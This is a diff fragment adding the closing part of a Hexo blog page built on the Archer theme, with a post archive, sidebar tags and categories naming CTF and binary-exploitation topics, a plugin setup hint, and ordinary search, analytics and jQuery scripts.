+            <span class="archive-post-date">07/21</span><a class="archive-post-title" href= "/2018/07/21/Code_Python学习手册_1/" >[Code]Python学习手册_第一部分_使用入门</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/21</span><a class="archive-post-title" href= "/2018/07/21/WP_巅峰极客/" >[WriteUp]巅峰极客</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/22</span><a class="archive-post-title" href= "/2018/01/22/Code_Python的C拓展/" >[Code]Python的C拓展</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="Note"><span class="iconfont-archer">&#xe606;</span>Note</span>
+    
+        <span class="sidebar-tag-name" data-tags="Assembly"><span class="iconfont-archer">&#xe606;</span>Assembly</span>
+    
+        <span class="sidebar-tag-name" data-tags="WASM"><span class="iconfont-archer">&#xe606;</span>WASM</span>
+    
+        <span class="sidebar-tag-name" data-tags="Binary"><span class="iconfont-archer">&#xe606;</span>Binary</span>
+    
+        <span class="sidebar-tag-name" data-tags="Pwn"><span class="iconfont-archer">&#xe606;</span>Pwn</span>
+    
+        <span class="sidebar-tag-name" data-tags="Canary"><span class="iconfont-archer">&#xe606;</span>Canary</span>
+    
+        <span class="sidebar-tag-name" data-tags="IDA"><span class="iconfont-archer">&#xe606;</span>IDA</span>
+    
+        <span class="sidebar-tag-name" data-tags="Linux"><span class="iconfont-archer">&#xe606;</span>Linux</span>
+    
+        <span class="sidebar-tag-name" data-tags="Asm"><span class="iconfont-archer">&#xe606;</span>Asm</span>
+    
+        <span class="sidebar-tag-name" data-tags="Android"><span class="iconfont-archer">&#xe606;</span>Android</span>
+    
+        <span class="sidebar-tag-name" data-tags="Heap"><span class="iconfont-archer">&#xe606;</span>Heap</span>
+    
+        <span class="sidebar-tag-name" data-tags="Tcache"><span class="iconfont-archer">&#xe606;</span>Tcache</span>
+    
+        <span class="sidebar-tag-name" data-tags="PDF"><span class="iconfont-archer">&#xe606;</span>PDF</span>
+    
+        <span class="sidebar-tag-name" data-tags="Code"><span class="iconfont-archer">&#xe606;</span>Code</span>
+    
+        <span class="sidebar-tag-name" data-tags="Python"><span class="iconfont-archer">&#xe606;</span>Python</span>
+    
+        <span class="sidebar-tag-name" data-tags="GDB"><span class="iconfont-archer">&#xe606;</span>GDB</span>
+    
+        <span class="sidebar-tag-name" data-tags="Gdb"><span class="iconfont-archer">&#xe606;</span>Gdb</span>
+    
+        <span class="sidebar-tag-name" data-tags="Pwntools"><span class="iconfont-archer">&#xe606;</span>Pwntools</span>
+    
+        <span class="sidebar-tag-name" data-tags="Qemu"><span class="iconfont-archer">&#xe606;</span>Qemu</span>
+    
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="WriteUp"><span class="iconfont-archer">&#xe606;</span>WriteUp</span>
+    
+        <span class="sidebar-tag-name" data-tags="Re"><span class="iconfont-archer">&#xe606;</span>Re</span>
+    
+        <span class="sidebar-tag-name" data-tags="CTFtime"><span class="iconfont-archer">&#xe606;</span>CTFtime</span>
+    
+        <span class="sidebar-tag-name" data-tags="IO_FILE"><span class="iconfont-archer">&#xe606;</span>IO_FILE</span>
+    
+        <span class="sidebar-tag-name" data-tags="Arm"><span class="iconfont-archer">&#xe606;</span>Arm</span>
+    
+        <span class="sidebar-tag-name" data-tags="Cpp"><span class="iconfont-archer">&#xe606;</span>Cpp</span>
+    
+        <span class="sidebar-tag-name" data-tags="StackOverflow"><span class="iconfont-archer">&#xe606;</span>StackOverflow</span>
+    
+        <span class="sidebar-tag-name" data-tags="Java"><span class="iconfont-archer">&#xe606;</span>Java</span>
+    
+        <span class="sidebar-tag-name" data-tags="JNI"><span class="iconfont-archer">&#xe606;</span>JNI</span>
+    
+        <span class="sidebar-tag-name" data-tags="Fmt"><span class="iconfont-archer">&#xe606;</span>Fmt</span>
+    
+        <span class="sidebar-tag-name" data-tags="wargame"><span class="iconfont-archer">&#xe606;</span>wargame</span>
+    
+        <span class="sidebar-tag-name" data-tags="Cfunc"><span class="iconfont-archer">&#xe606;</span>Cfunc</span>
+    
+        <span class="sidebar-tag-name" data-tags="IntegerOverflow"><span class="iconfont-archer">&#xe606;</span>IntegerOverflow</span>
+    
+        <span class="sidebar-tag-name" data-tags="HouseOfRoman"><span class="iconfont-archer">&#xe606;</span>HouseOfRoman</span>
+    
+        <span class="sidebar-tag-name" data-tags="ShellCode"><span class="iconfont-archer">&#xe606;</span>ShellCode</span>
+    
+        <span class="sidebar-tag-name" data-tags="FastbinAttack"><span class="iconfont-archer">&#xe606;</span>FastbinAttack</span>
+    
+        <span class="sidebar-tag-name" data-tags="HeapOverflow"><span class="iconfont-archer">&#xe606;</span>HeapOverflow</span>
+    
+        <span class="sidebar-tag-name" data-tags="StackOvrtflow"><span class="iconfont-archer">&#xe606;</span>StackOvrtflow</span>
+    
+        <span class="sidebar-tag-name" data-tags="SystemCall"><span class="iconfont-archer">&#xe606;</span>SystemCall</span>
+    
+        <span class="sidebar-tag-name" data-tags="prctl"><span class="iconfont-archer">&#xe606;</span>prctl</span>
+    
+        <span class="sidebar-tag-name" data-tags="global_max_fast"><span class="iconfont-archer">&#xe606;</span>global_max_fast</span>
+    
+        <span class="sidebar-tag-name" data-tags="read"><span class="iconfont-archer">&#xe606;</span>read</span>
+    
+        <span class="sidebar-tag-name" data-tags="UAF"><span class="iconfont-archer">&#xe606;</span>UAF</span>
+    
+        <span class="sidebar-tag-name" data-tags="XCTF"><span class="iconfont-archer">&#xe606;</span>XCTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="Fastbin"><span class="iconfont-archer">&#xe606;</span>Fastbin</span>
+    
+        <span class="sidebar-tag-name" data-tags="FormatString"><span class="iconfont-archer">&#xe606;</span>FormatString</span>
+    
+        <span class="sidebar-tag-name" data-tags="OJ"><span class="iconfont-archer">&#xe606;</span>OJ</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="Assembly"><span class="iconfont-archer">&#xe60a;</span>Assembly</span>
+    
+        <span class="sidebar-category-name" data-categories="Binary"><span class="iconfont-archer">&#xe60a;</span>Binary</span>
+    
+        <span class="sidebar-category-name" data-categories="Code"><span class="iconfont-archer">&#xe60a;</span>Code</span>
+    
+        <span class="sidebar-category-name" data-categories="Linux"><span class="iconfont-archer">&#xe60a;</span>Linux</span>
+    
+        <span class="sidebar-category-name" data-categories="WriteUp"><span class="iconfont-archer">&#xe60a;</span>WriteUp</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "骑麦兜看落日"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+        <div class="site-search">
+  <div class="algolia-popup popup">
+    <div class="algolia-search">
+      <div class="algolia-search-input-icon">
+        <i class="fa fa-search"></i>
+      </div>
+      <div class="algolia-search-input" id="algolia-search-input"></div>
+    </div>
+
+    <div class="algolia-results">
+      <div id="algolia-stats"></div>
+      <div id="algolia-hits"></div>
+      <div id="algolia-pagination" class="algolia-pagination"></div>
+    </div>
+
+    <span class="popup-btn-close">
+      <i class="iconfont-archer">&#xe609;</i>
+    </span>
+  </div>
+</div>
+        <script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.8.0/dist/instantsearch.min.js" defer></script>
+        <script src="/scripts/search.js" defer></script>
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
